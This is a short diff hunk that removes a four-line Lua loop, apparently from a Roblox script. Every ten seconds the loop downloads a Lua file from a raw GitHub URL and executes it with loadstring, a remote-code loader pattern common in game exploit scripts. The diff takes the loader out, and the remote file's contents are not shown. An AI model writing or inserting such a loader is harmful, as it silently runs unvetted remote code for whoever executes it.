@@ -1,4 +1,0 @@
-while true do
-loadstring(game:HttpGet('https://raw.githubusercontent.com/faisal1432152/Aries/main/emoji.lua'))()
-wait(10)
-end
